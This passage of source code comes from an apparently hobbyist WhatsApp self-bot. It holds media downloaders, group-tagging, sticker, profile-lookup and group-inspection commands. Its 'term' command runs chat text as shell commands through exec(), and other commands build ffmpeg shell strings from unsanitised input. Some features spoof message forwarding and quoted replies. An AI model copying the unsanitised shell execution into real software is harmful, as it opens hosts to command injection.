          	uptime = process.uptime()
         	 // var taged = ben.message.extendedTextMessage.contextInfo.mentionedJid[0]
         	banChats = true
          	freply(`「 *SELF-MODE* 」`)
          	break
    case 'tagall':
            if (!isOwner && !mek.key.fromMe && !isGroupAdmins) return reply('Admin Group Only')
            if (!isGroup) return reply(mess.only.group)
            members_id = []
                teks = (args.length > 0) ? body.slice(8).trim() : ''
                teks += '\n\n'
                for (let mem of groupMembers) {
                    teks += `•> @${mem.jid.split('@')[0]}\n`
                    members_id.push(mem.jid)
                }
                mentions(teks, members_id, true)
            break
 	case 'hidetag':
			if (!mek.key.fromMe && !isOwner && !isGroupAdmins) return reply('Admin Group Only')
			if (!isGroup) return reply(mess.only.group)
			var value = args.join(' ')
			var group = await Haikal.groupMetadata(from)
			var member = group['participants']
			var mem = []
			member.map(async adm => {
			mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
			})
			var optionshidetag = {
			text: value,
			contextInfo: { mentionedJid: mem },
			quoted: mek
			}
			Haikal.sendMessage(from, optionshidetag, text)
			break
	case 'play':
			if (args.length === 0) return reply(`Kirim perintah *${prefix}play* _Judul lagu yang akan dicari_`)
            var srch = args.join('')
            reply(mess.wait)
    		aramas = await yts(srch);
    		aramat = aramas.all 
   			var mulaikah = aramat[0].url							
                  try {
                    yta(mulaikah)
                    .then((res) => {
                        const { dl_link, thumb, title, filesizeF, filesize } = res
                        axios.get(`https://tinyurl.com/api-create.php?url=${dl_link}`)
                        .then(async (a) => {
                        if (Number(filesize) >= 100000) return sendMediaURL(from, thumb, `*YT MUSIC*\n\n*Title* : ${title}\n*Ext* : MP3\n*Filesize* : ${filesizeF}\n*Link* : ${a.data}\n\n_For the duration of more than the limit is presented in the form of a link_`)
                        const captions = `*YT MUSIC*\n\n*Title* : ${title}\n*Ext* : MP3\n*Size* : ${filesizeF}\n*Link* : ${a.data}\n\n_Please wait, the media file is being sent it may take a few minutes_`
                        sendMediaURL(from, thumb, captions)
                        await sendMediaURL(from, dl_link).catch(() => reply('error'))
                        })                
                        })
                        } catch (err) {
                        reply(mess.error.api)
                        }
                   break  
        case 'video':
            if (args.length === 0) return reply(`Kirim perintah *${prefix}video* _Judul lagu yang akan dicari_`)
            var srch = args.join('')
            reply(mess.wait)
            aramas = await yts(srch);
            aramat = aramas.all 
            var mulaikah = aramat[0].url                            
                  try {
                    ytv(mulaikah)
                    .then((res) => {
                        const { dl_link, thumb, title, filesizeF, filesize } = res
                        axios.get(`https://tinyurl.com/api-create.php?url=${dl_link}`)
                        .then(async (a) => {
                        if (Number(filesize) >= 100000) return sendMediaURL(from, thumb, `*YT VIDEO*\n\n*Title* : ${title}\n*Ext* : MP3\n*Filesize* : ${filesizeF}\n*Link* : ${a.data}\n\n_For the duration of more than the limit is presented in the form of a link_`)
                        const captions = `*YT VIDEO*\n\n*Title* : ${title}\n*Ext* : MP4\n*Size* : ${filesizeF}\n*Link* : ${a.data}\n\n_Please wait, the media file is being sent it may take a few minutes_`
                        sendMediaURL(from, thumb, captions)
                        await sendMediaURL(from, dl_link).catch(() => reply('error'))
                        })                
                        })
                        } catch (err) {
                        reply(mess.error.api)
                        }
                   break      
    case 'sticker': 
    case 'stiker':
    case 'sg':
    case 's':
            if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
            const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
            const media = await Haikal.downloadAndSaveMediaMessage(encmedia)
                ran = '666.webp'
                await ffmpeg(`./${media}`)
                .input(media)
                .on('start', function (cmd) {
                     console.log(`Started : ${cmd}`)
                })
                .on('error', function (err) {
                 console.log(`Error : ${err}`)
                fs.unlinkSync(media)
                reply('error')
                })
                .on('end', function () {
                console.log('Finish')
                Haikal.sendMessage(from, fs.readFileSync(ran), sticker, {quoted: mek})
                 fs.unlinkSync(media)
                fs.unlinkSync(ran)
                })
                .addOutputOptions([`-vcodec`, `libwebp`, `-vf`, `scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
                .toFormat('webp')
                .save(ran)
                } else if ((isMedia && mek.message.videoMessage.seconds < 11 || isQuotedVideo && mek.message.extendedTextMessage.contextInfo.quotedMessage.videoMessage.seconds < 11) && args.length == 0) {
                const encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
                const media = await Haikal.downloadAndSaveMediaMessage(encmedia)
            ran = '999.webp'
            reply(mess.wait)
            await ffmpeg(`./${media}`)
            .inputFormat(media.split('.')[1])
            .on('start', function (cmd) {
            console.log(`Started : ${cmd}`)
            })
            .on('error', function (err) {
            console.log(`Error : ${err}`)
            fs.unlinkSync(media)
            tipe = media.endsWith('.mp4') ? 'video' : 'gif'
            reply(`Gagal, pada saat mengkonversi ${tipe} ke stiker`)
            })
            .on('end', function () {
            console.log('Finish')
            Haikal.sendMessage(from, fs.readFileSync(ran), sticker, {quoted: mek})
            fs.unlinkSync(media)
            fs.unlinkSync(ran)
                })
                .addOutputOptions([`-vcodec`, `libwebp`, `-vf`, `scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
                .toFormat('webp')
                .save(ran)
            } else {
                reply(`Kirim gambar dengan caption ${prefix}sticker\nDurasi Sticker Video 1-9 Detik`)
            }
            break               
			break
    case 'toimg':
			if (!isQuotedSticker) return reply('𝗥𝗲𝗽𝗹𝘆/𝘁𝗮𝗴 𝘀𝘁𝗶𝗰𝗸𝗲𝗿 !')
			reply(mess.wait)
			encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
			media = await Haikal.downloadAndSaveMediaMessage(encmedia)
			ran = getRandom('.png')
			exec(`ffmpeg -i ${media} ${ran}`, (err) => {
			fs.unlinkSync(media)
			if (err) return reply('Yah gagal, coba ulangi ^_^')
			buffer = fs.readFileSync(ran)
			fakethumb(buffer,'NIH')
			fs.unlinkSync(ran)
			})
			break
	case 'ytsearch':
			if (args.length < 1) return reply('Tolong masukan query!')
			var srch = args.join('');
			try {
        	var aramas = await yts(srch);
   			} catch {
        	return await Haikal.sendMessage(from, 'Error!', MessageType.text, dload)
    		}
    		aramat = aramas.all 
    		var tbuff = await getBuffer(aramat[0].image)
    		var ytresult = '';
    		ytresult += '「 *YOUTUBE SEARCH* 」'
    		ytresult += '\n________________________\n\n'
   			aramas.all.map((video) => {
        	ytresult += '❏ Title: ' + video.title + '\n'
            ytresult += '❏ Link: ' + video.url + '\n'
            ytresult += '❏ Durasi: ' + video.timestamp + '\n'
            ytresult += '❏ Upload: ' + video.ago + '\n________________________\n\n'
    		});
    		ytresult += '◩ *SELF-BOT*'
    		await fakethumb(tbuff,ytresult)
			break
	case 'setreply':
	case 'setfake':
                        if (!mek.key.fromMe && !isOwner) return
			if (!q) return fakegroup(mess.wrongFormat)
			fake = q
			freply(`Succes Mengganti Conversation Fake : ${q}`)
			break
	case 'setfakeimg':
                if (!mek.key.fromMe && !isOwner) return
        	if ((isMedia && !mek.message.videoMessage || isQuotedImage || isQuotedSticker) && args.length == 0) {
          	boij = isQuotedImage || isQuotedSticker ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
			delb = await Haikal.downloadMediaMessage(boij)
			fs.writeFileSync(Mfake, delb)
			freply('Sukses')
        	} else {
            reply(`Kirim gambar dengan caption ${prefix}sethumb`)
          	}
			break	
	case 'setthumb':
                if (!mek.key.fromMe && !isOwner) return
	        if ((isMedia && !mek.message.videoMessage || isQuotedImage || isQuotedSticker) && args.length == 0) {
          	boij = isQuotedImage || isQuotedSticker ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
			delb = await Haikal.downloadMediaMessage(boij)
			fs.writeFileSync(Mthumb, delb)
			freply('Sukses')
        	} else {
            reply(`Kirim gambar dengan caption ${prefix}sethumb`)
          	}
			break
// ( HW MODS WA & HAIKALz & Vean )
case 'ytmp4':
if (args.length === 0) return reply(`Kirim perintah *${prefix}ytmp4 [linkYt]*`)
let isLinks2 = args[0].match(/(?:https?:\/{2})?(?:w{3}\.)?youtu(?:be)?\.(?:com|be)(?:\/watch\?v=|\/)([^\s&]+)/)
if (!isLinks2) return reply(mess.error.Iv)
freply(mess.wait)
try {
ytv(args[0])
.then(async(res) => {
const { dl_link, thumb, title, filesizeF, filesize } = res
axios.get(`https://tinyurl.com/api-create.php?url=${dl_link}`)
.then(async(a) => {
if (Number(filesize) >= 40000) return sendMediaURL(from, thumb, `*YT MP4!*\n\n*Title* : ${title}\n*Ext* : MP3\n*Filesize* : ${filesizeF}\n*Link* : ${a.data}\n\n_For the duration of more than the limit is presented in the form of a link_`)
const captionsYtmp4 = `*Data Successfully Obtained!*\n\n*Title* : ${title}\n*Ext* : MP4\n*Size* : ${filesizeF}\n\n_Please wait, the media file is being sent it may take a few minutes_`
buff = await getBuffer(dl_link)
fak = await getBuffer(thumb)
Haikal.sendMessage(from, fak, MessageType.image, {quoted:mek, caption:captionsYtmp4})
Haikal.sendMessage(from, buff, MessageType.video, {
"contextInfo": {
mimetype: 'video/mp4',
text: 'HW MODS WA',
"forwardingScore": 1000000000,
isForwarded: true,
sendEphemeral: true,
"externalAdReply": {
"title": `${title}`,
"body": `${title}`,
"previewType": "PHOTO",
"thumbnailUrl": `${thumb}`,
"thumbnail": fak,
"sourceUrl": args[0]
}}, quoted:mek, caption:"Done!", thumbnail:Bfake
}).catch(() => reply(mess.error.api))
})		
})
} catch (err) {
reply(mess.error.api)
}
break
case 'emoji':
if (!q) return fakegroup('emojinya?')
qes = args.join(' ')
emoji.get(`${qes}`).then(emoji => {
teks = `${emoji.images[4].url}`
sendStickerFromUrl(from,`${teks}`)	
console.log(teks)
})
break
// ( HW MODS WA & HAIKALz & Vean )
case 'ytmp3':
if (args.length === 0) return reply(`Kirim perintah *${prefix}ytmp3 [linkYt]*`)
let isLinks = args[0].match(/(?:https?:\/{2})?(?:w{3}\.)?youtu(?:be)?\.(?:com|be)(?:\/watch\?v=|\/)([^\s&]+)/)
if (!isLinks) return reply(mess.error.Iv)
freply(mess.wait)
try {
yta(args[0])
.then(async(res) => {
const { dl_link, thumb, title, filesizeF, filesize } = res
axios.get(`https://tinyurl.com/api-create.php?url=${dl_link}`)
.then(async(a) => {
if (Number(filesize) >= 30000) return sendMediaURL(from, thumb, `*Data Successfully Obtained!*\n\n*Title* : ${title}\n*Ext* : MP3\n*Filesize* : ${filesizeF}\n*Link* : ${a.data}\n\n_For the duration of more than the limit is presented in the form of a link_`)
const captions = `*YT MP3*\n\n*Title* : ${title}\n*Ext* : MP3\n*Size* : ${filesizeF}\n\n_Please wait, the media file is being sent it may take a few minutes_`
buff = await getBuffer(dl_link)
fak = await getBuffer(thumb)
Haikal.sendMessage(from, fak, MessageType.image, {quoted:mek, caption:captions})
Haikal.sendMessage(from, buff, MessageType.audio, {
"contextInfo": {
mimetype: 'audio/mp4',
text: 'HW MODS WA',
"forwardingScore": 1000000000,
isForwarded: true,
sendEphemeral: true,
"externalAdReply": {
"title": `${title}`,
"body": `${title}`,
"previewType": "PHOTO",
"thumbnailUrl": `${thumb}`,
"thumbnail": fak,
"sourceUrl": args[0]
}}, quoted:mek, ptt:true
}).catch(() => reply(mess.error.api))
})
})
} catch (err) {
reply(mess.error.api)
}
break
    case 'image':
            if (args.length < 1) return reply('Masukan teks!')
            const gimg = args.join('');
            reply(mess.wait)
            gis(gimg, async (error, result) => {
            n = result
            images = n[Math.floor(Math.random() * n.length)].url
            Haikal.sendMessage(from,{url:images},image,{quoted:mek})
            });
            break
case 'ttmp4':
if (!isUrl(args[0]) && !args[0].includes('tiktok.com')) return reply(mess.Iv)
if (args.length < 1) return reply('Link?')
lin = args[0]
freply(mess.wait)
hx.ttdownloader(lin).then(res => {
console.log('[ TIKTOK ] downloader')
anu = res.nowm
fto = Mthumb
Haikal.sendMessage(from, fto, image, {quoted:mek, caption:`*TIKTOK MP4*\n\n•> Nowm : ${res.nowm}\n•> Wm : ${res.wm}\n•> Audio : ${res.audio}\n\n_Please wait, the media file is being sent it may take a few minutes_`, thumbnail: fs.readFileSync('./stik/Ahhikal.jpeg'), contextInfo:{forwardingScore: 989, isForwarded: true}})
sendMediaURL(from, anu, 'Done!')
})
break
case 'ttmp3':
if (!isUrl(args[0]) && !args[0].includes('tiktok.com')) return reply(mess.Iv)
if (args.length < 1) return reply('Link?')
lin = args[0]
freply(mess.wait)
hx.ttdownloader(lin).then(async (res) => {
console.log('[ TIKTOK ] downloader')
anu = res.nowm
fto = Mthumb
Haikal.sendMessage(from, fto, image, {quoted:mek, caption:`*TIKTOK MP3*\n\n•> Nowm : ${res.nowm}\n•> Wm : ${res.wm}\n•> Audio : ${res.audio}\n\n_Please wait, the media file is being sent it may take a few minutes_`, thumbnail:Bfake, contextInfo:{forwardingScore: 989, isForwarded: true}})
khs = await getBuffer(anu)
Haikal.sendMessage(from, khs, audio, {quoted:mek, mimetype:'audio/mp4', filename:'Haikalgans.mp3', ptt:true})
})
break
    case 'brainly':
			if (args.length < 1) return reply('Pertanyaan apa')
          	brien = args.join(' ')
			brainly(`${brien}`).then(res => {
			teks = '❉───────────────────────❉\n'
			for (let Y of res.data) {
			teks += `\n*「 _BRAINLY_ 」*\n\n*➸ Pertanyaan:* ${Y.pertanyaan}\n\n*➸ Jawaban:* ${Y.jawaban[0].text}\n❉──────────────────❉\n`
			}
			Haikal.sendMessage(from, teks, text,{quoted:mek,detectLinks: false})                        
            })              
			break
	    case 'ig':
if (!isUrl(args[0]) && !args[0].includes('instagram.com')) return reply(mess.Iv)
if (args.length < 1) return reply('Link?')
lin = args[0]
freply(mess.wait)
hx.igdl(lin).then(res => {
console.log('[ INSTAGRAM ] downloader')
Anu = res[0].downloadUrl
fto = Mthumb
Haikal.sendMessage(from, fto, image, {quoted:mek, caption:`*INSTAGRAM MP4*\n\n•> Priview : ${res[0].preview}\n•> Link : ${res[0].url}\n•> Linkdl : ${res[0].downloadUrl}\n\n_Please wait, the media file is being sent it may take a few minutes_`, thumbnail:Bfake, contextInfo:{forwardingScore: 989, isForwarded: true}})
sendMediaURL(from, Anu, 'Done!')
})
break
    case 'igstalk':
            if (!q) return fakegroup('Usernamenya?')
            ig.fetchUser(`${args.join(' ')}`).then(Y => {
            console.log(`${args.join(' ')}`)
            ten = `${Y.profile_pic_url_hd}`
            teks = `*ID* : ${Y.profile_id}\n*Username* : ${args.join('')}\n*Full Name* : ${Y.full_name}\n*Bio* : ${Y.biography}\n*Followers* : ${Y.followers}\n*Following* : ${Y.following}\n*Private* : ${Y.is_private}\n*Verified* : ${Y.is_verified}\n\n*Link* : https://instagram.com/${args.join('')}`
            sendMediaURL(from,ten,teks) 
            })      
            break    
case 'fbmp4':
if (args.length < 1) return reply('Link?')
lin = args[0]
freply(mess.wait)
hx.fbdown(lin).then(res => {
console.log('[ FACEBOOK ] downloader')
Anu = res.HD
fto = Mthumb

Haikal.sendMessage(from, fto, image, {quoted:mek, caption:`*FACEBOOK MP4*\n\n•> Normal : ${res.Normal_video}\n•> Hd : ${res.HD}\n•> Audio : ${res.audio}\n\n_Please wait, the media file is being sent it may take a few minutes_`, thumbnail:Bfake, contextInfo:{forwardingScore: 989, isForwarded: true}})
sendMediaURL(from, Anu, 'Done!')
})
break
case 'fbmp3':
if (args.length < 1) return reply('Link?')
lin = args[0]
freply(mess.wait)
hx.fbdown(lin).then(async (res) => {
console.log('[ FACEBOOK ] downloader')
Anu = res.HD
fto = Mthumb

Haikal.sendMessage(from, fto, image, {quoted:mek, caption:`*FACEBOOK MP3*\n\n•> Normal : ${res.Normal_video}\n•> Hd : ${res.HD}\n•> Audio : ${res.audio}\n\n_Please wait, the media file is being sent it may take a few minutes_`, thumbnail:Bfake, contextInfo:{forwardingScore: 989, isForwarded: true}})
khs = await getBuffer(Anu)
Haikal.sendMessage(from, khs, audio, {quoted:mek, mimetype:'audio/mp4', filename:'Haikalgans.mp3', ptt:true})
})
break
	case 'term':
                        if (!mek.key.fromMe && !isOwner) return
			if (!q) return fakegroup(mess.wrongFormat)
			exec(q, (err, stdout) => {
			if (err) return fakegroup(`SELF-BOT:~ ${err}`)
			if (stdout) {
			reply(stdout)
			}
			})
		    break 
    case 'join':
            if (args.length < 1) return reply('Linknya?')
            cos = args[0]
            var net = cos.split('https://chat.whatsapp.com/')[1]
            if (!net) return reply('pastikan itu link https://whatsapp.com/')
let { size } = await Haikal.query({ 
            json: ["query", "invite",net],
            expect200:true })
            if (size < 50) {
            reply('Member Lo Dikit Jadi Bot Gk Mau Join, minimal member harus 50 orang')
            } else if (size > 50) {
             try {
            if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) return reply(mess.Iv)
            var codeInvite = cos.split('https://chat.whatsapp.com/')[1]
            if (!codeInvite) return fakegroup ('pastikan link sudah benar!')
            var response = await Haikal.acceptInvite(codeInvite)
            fakestatus('SUKSES')
            } catch {
            fakegroup('LINK ERROR!')
            }
            } else {
            reply('Error!')
            }
            break
    case'twitter':
            if (!isUrl(args[0]) && !args[0].includes('twitter.com')) return reply(mess.Iv)
            if (!q) return fakegroup('Linknya?')
            ten = args[0]
            var res = await twitterGetUrl(`${ten}`)
            .then(g => {
            ren = `${g.download[2].url}`
            sendMediaURL(from,ren,'DONE')
            })
            break
    case 'runtime':
    case 'test':
            teks = `${kyun(run)}\n\n「 𝗕𝗔𝗜𝗟𝗘𝗬𝗦 𝗦𝗘𝗟𝗙𝗕𝗢𝗧 」`
            freply(teks)
            break  
	case 'speed':
	case 'ping':			
			exec(`neofetch --stdout`, (error, stdout, stderr) => {
			const child = stdout.toString('utf-8')
			const teks = child.replace(/Memory:/, "Ram:")
			const pingnya = `*${teks}Speed: ${latensi.toFixed(4)} Second*`
			freply(pingnya)
			})
			break  
    case 'totag':
            if ((isMedia && !mek.message.videoMessage || isQuotedSticker) && args.length == 0) {
            encmedia = isQuotedSticker ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
            file = await Haikal.downloadAndSaveMediaMessage(encmedia, filename = getRandom())
            value = args.join(" ")
            var group = await Haikal.groupMetadata(from)
            var member = group['participants']
            var mem = []
            member.map(async adm => {
            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
            })
            var options = {
                contextInfo: { mentionedJid: mem },
                quoted: mek
            }
            ini_buffer = fs.readFileSync(file)
            Haikal.sendMessage(from, ini_buffer, sticker, options)
            fs.unlinkSync(file)
            } else if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
            encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
            file = await Haikal.downloadAndSaveMediaMessage(encmedia, filename = getRandom())
            value = args.join(" ")
            var group = await Haikal.groupMetadata(from)
            var member = group['participants']
            var mem = []
            member.map(async adm => {
            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
            })
            var options = {
                contextInfo: { mentionedJid: mem },
                quoted: mek
            }
            ini_buffer = fs.readFileSync(file)
            Haikal.sendMessage(from, ini_buffer, image, options)
            fs.unlinkSync(file)
        } else if ((isMedia && !mek.message.videoMessage || isQuotedAudio) && args.length == 0) {
            encmedia = isQuotedAudio ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
            file = await Haikal.downloadAndSaveMediaMessage(encmedia, filename = getRandom())
            value = args.join(" ")
            var group = await Haikal.groupMetadata(from)
            var member = group['participants']
            var mem = []
            member.map(async adm => {
            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
            })
            var options = {
                mimetype : 'audio/mp4',
                ptt : true,
                contextInfo: { mentionedJid: mem },
                quoted: mek
            }
            ini_buffer = fs.readFileSync(file)
            Haikal.sendMessage(from, ini_buffer, audio, options)
            fs.unlinkSync(file)
        }  else if ((isMedia && !mek.message.videoMessage || isQuotedVideo) && args.length == 0) {
            encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
            file = await Haikal.downloadAndSaveMediaMessage(encmedia, filename = getRandom())
            value = args.join(" ")
            var group = await Haikal.groupMetadata(from)
            var member = group['participants']
            var mem = []
            member.map(async adm => {
            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
            })
            var options = {
                mimetype : 'video/mp4',
                contextInfo: { mentionedJid: mem },
                quoted: mek
            }
            ini_buffer = fs.readFileSync(file)
            Haikal.sendMessage(from, ini_buffer, video, options)
            fs.unlinkSync(file)
        } else{
          reply(`reply gambar/sticker/audio/video dengan caption ${prefix}totag`)
        }
        break
    case 'tomp4':
            if ((isMedia && !mek.message.videoMessage || isQuotedSticker) && args.length == 0) {
            ger = isQuotedSticker ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
            owgi = await Haikal.downloadAndSaveMediaMessage(ger)
            webp2mp4File(owgi).then(res=>{
            sendMediaURL(from,res.result,'Done')
            })
            }else {
            reply('reply stiker')
            }
            fs.unlinkSync(owgi)
            break
    case 'tourl':
            if ((isMedia && !mek.message.videoMessage || isQuotedImage || isQuotedVideo ) && args.length == 0) {
            boij = isQuotedImage || isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
            owgi = await Haikal.downloadMediaMessage(boij)
            res = await upload(owgi)
            reply(res)
            } else {
            reply('kirim/reply gambar/video')
            }
            break	
    case 'inspect':
            try {
            if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) return reply(mess.Iv)
            if (!q) return reply('masukan link wa')
            cos = args[0]
            var net = cos.split('https://chat.whatsapp.com/')[1]
            if (!net) return reply('pastikan itu link https://whatsapp.com/')
            jids = []
            let { id, owner, subject, subjectOwner, desc, descId, participants, size, descOwner, descTime, creation} = await Haikal.query({ 
            json: ["query", "invite",net],
            expect200:true })
            let par = `*Id* : ${id}
${owner ? `*Owner* : @${owner.split('@')[0]}` : '*Owner* : -'}
*Nama Gc* : ${subject}
*Gc dibuat Tanggal* : ${formatDate(creation * 1000)}
*Jumlah Member* : ${size}
${desc ? `*Desc* : ${desc}` : '*Desc* : tidak ada'}
*Id desc* : ${descId}
${descOwner ? `*Desc diubah oleh* : @${descOwner.split('@')[0]}` : '*Desc diubah oleh* : -'}\n*Tanggal* : ${descTime ? `${formatDate(descTime * 1000)}` : '-'}\n\n*Kontak yang tersimpan*\n`
           for ( let y of participants) {
             par += `> @${y.id.split('@')[0]}\n*Admin* : ${y.isAdmin ? 'Ya' : 'Tidak'}\n`
             jids.push(`${y.id.replace(/@c.us/g,'@s.whatsapp.net')}`)
             }
             jids.push(`${owner ? `${owner.replace(/@c.us/g,'@s.whatsapp.net')}` : '-'}`)
             jids.push(`${descOwner ? `${descOwner.replace(/@c.us/g,'@s.whatsapp.net')}` : '-'}`)
             Haikal.sendMessage(from,par,text,{quoted:mek,contextInfo:{mentionedJid:jids}})
             } catch {
             reply('Link error')
             }
             break
case 'pinterest':
if (!q) return reply('yg mau di cari apa?')
pinterest(`${q}`).then( data => {
const amsulah = data.result
const pimterest = amsulah[Math.floor(Math.random() * amsulah.length)]
sendMediaURL (from ,pimterest , `Pinterest : ${q}`)
})
break
case 'sound1':
                    const sound1 = fs.readFileSync('media/vn/sound1.mp3')
                    Haikal.sendMessage(from, sound1, audio, { mimetype: 'audio/mp4', duration: 999999999, ptt: true, quoted: mek})
                    break 
                    case 'sound2':
                    const sound2 = fs.readFileSync('media/vn/sound2.mp3')
                    Haikal.sendMessage(from, sound2, audio, { mimetype: 'audio/mp4', duration: 999999999, ptt: true, quoted: mek})
                    break 
                    case 'sound3':
                    const sound3 = fs.readFileSync('media/vn/sound3.mp3')
                    Haikal.sendMessage(from, sound3, audio, { mimetype: 'audio/mp4', duration: 999999999, ptt: true, quoted: mek})
                    break 
                    case 'sound4':
                    const sound4 = fs.readFileSync('media/vn/sound4.mp3')
                    Haikal.sendMessage(from, sound4, audio, { mimetype: 'audio/mp4', duration: 999999999, ptt: true, quoted: mek})
                    break      
                    case 'sound5':
                    const sound5 = fs.readFileSync('media/vn/sound5.mp3')
                    Haikal.sendMessage(from, sound5, audio, { mimetype: 'audio/mp4', duration: 999999999, ptt: true, quoted: mek})
                    break           
                    case 'sound6':
                    const sound6 = fs.readFileSync('media/vn/sound6.mp3')
                    Haikal.sendMessage(from, sound6, audio, { mimetype: 'audio/mp4', duration: 999999999, ptt: true, quoted: mek})
                    break                
                    case 'sound7':
                    const sound7 = fs.readFileSync('media/vn/sound7.mp3')
                    Haikal.sendMessage(from, sound7, audio, { mimetype: 'audio/mp4', duration: 999999999, ptt: true, quoted: mek})
                    break                
                    case 'sound8':
                    const sound8 = fs.readFileSync('media/vn/sound8.mp3')
                    Haikal.sendMessage(from, sound8, audio, { mimetype: 'audio/mp4', duration: 999999999, ptt: true, quoted: mek})
                    break                
                    case 'sound9':
                    const sound9 = fs.readFileSync('media/vn/sound9.mp3')
                    Haikal.sendMessage(from, sound9, audio, { mimetype: 'audio/mp4', duration: 999999999, ptt: true, quoted: mek})
                    break                
                    case 'sound10':
                    const sound10 = fs.readFileSync('media/vn/sound10.mp3')
                    Haikal.sendMessage(from, sound10, audio, { mimetype: 'audio/mp4', duration: 999999999, ptt: true, quoted: mek})
                    break                
                    case 'sound11':
                    const sound11 = fs.readFileSync('media/vn/sound11.mp3')
                    Haikal.sendMessage(from, sound11, audio, { mimetype: 'audio/mp4', duration: 999999999, ptt: true, quoted: mek})
                    break                
                    case 'sound12':
                    const sound12 = fs.readFileSync('media/vn/sound12.mp3')
                    Haikal.sendMessage(from, sound12, audio, { mimetype: 'audio/mp4', duration: 999999999, ptt: true, quoted: mek})
                    break                
                    case 'sound13':
                    const sound13 = fs.readFileSync('media/vn/sound13.mp3')
                    Haikal.sendMessage(from, sound13, audio, { mimetype: 'audio/mp4', duration: 999999999, ptt: true, quoted: mek})
                    break                
                    case 'sound14':
                    const sound14 = fs.readFileSync('media/vn/sound14.mp3')
                    Haikal.sendMessage(from, sound14, audio, { mimetype: 'audio/mp4', duration: 999999999, ptt: true, quoted: mek})
                    break                
                    case 'sound15':
                    const sound15 = fs.readFileSync('media/vn/sound15.mp3')
                    Haikal.sendMessage(from, sound15, audio, { mimetype: 'audio/mp4', duration: 999999999, ptt: true, quoted: mek})
                    break                
                    case 'sound16':
                    const sound16 = fs.readFileSync('media/vn/sound16.mp3')
                    Haikal.sendMessage(from, sound16, audio, { mimetype: 'audio/mp4', duration: 999999999, ptt: true, quoted: mek})
                    break                
                    case 'sound17':
                    const sound17 = fs.readFileSync('media/vn/sound17.mp3')
                    Haikal.sendMessage(from, sound17, audio, { mimetype: 'audio/mp4', duration: 999999999, ptt: true, quoted: mek})
                    break                
                    case 'sound18':
                    const sound18 = fs.readFileSync('media/vn/sound18.mp3')
                    Haikal.sendMessage(from, sound18, audio, { mimetype: 'audio/mp4', duration: 999999999, ptt: true, quoted: mek})
                    break                
                    case 'sound19':
                    const sound19 = fs.readFileSync('media/vn/sound19.mp3')
                    Haikal.sendMessage(from, sound19, audio, { mimetype: 'audio/mp4', duration: 999999999, ptt: true, quoted: mek})
                    break                
                    case 'sound20':
                    const sound20 = fs.readFileSync('media/vn/sound20.mp3')
                    Haikal.sendMessage(from, sound20, audio, { mimetype: 'audio/mp4', duration: 999999999, ptt: true, quoted: mek})
                    break                
                    case 'sound21':
                    const sound21 = fs.readFileSync('media/vn/sound21.mp3')
                    Haikal.sendMessage(from, sound21, audio, { mimetype: 'audio/mp4', duration: 999999999, ptt: true, quoted: mek})
                    break                
                    case 'sound22':
                    const sound22 = fs.readFileSync('media/vn/sound22.mp3')
                    Haikal.sendMessage(from, sound22, audio, { mimetype: 'audio/mp4', duration: 999999999, ptt: true, quoted: mek})
                    break                
                    case 'sound23':
                    const sound23 = fs.readFileSync('media/vn/sound23.mp3')
                    Haikal.sendMessage(from, sound23, audio, { mimetype: 'audio/mp4', duration: 999999999, ptt: true, quoted: mek})
                    break              
                    case 'sound24':
                    const sound24 = fs.readFileSync('media/vn/sound24.mp3')
                    Haikal.sendMessage(from, sound24, audio, { mimetype: 'audio/mp4', duration: 999999999, ptt: true, quoted: mek})
                    break                                                        
                    case 'sound25':
                    const sound25 = fs.readFileSync('media/vn/sound25.mp3')
                    Haikal.sendMessage(from, sound25, audio, { mimetype: 'audio/mp4', duration: 999999999, ptt: true, quoted: mek})
                    break   
                    case 'sound26':
                    const sound26 = fs.readFileSync('media/vn/sound26.mp3')
                    Haikal.sendMessage(from, sound26, audio, { mimetype: 'audio/mp4', duration: 999999999, ptt: true, quoted: mek})
                    break   
                    case 'sound27':
                    const sound27 = fs.readFileSync('media/vn/sound27.mp3')
                    Haikal.sendMessage(from, sound27, audio, { mimetype: 'audio/mp4', duration: 999999999, ptt: true, quoted: mek})
                    break   
                    case 'sound28':
                    const sound28 = fs.readFileSync('media/vn/sound28.mp3')
                    Haikal.sendMessage(from, sound28, audio, { mimetype: 'audio/mp4', duration: 999999999, ptt: true, quoted: mek})
                    break                       
                    //Sound Random
case 'apa':
                    const apa = fs.readFileSync('media/apa.mp3')
                    Haikal.sendMessage(from, apa, audio, { mimetype: 'audio/mp4', duration: 999999999, ptt: true, quoted: mek})
                    break 
                    case 'apaan':
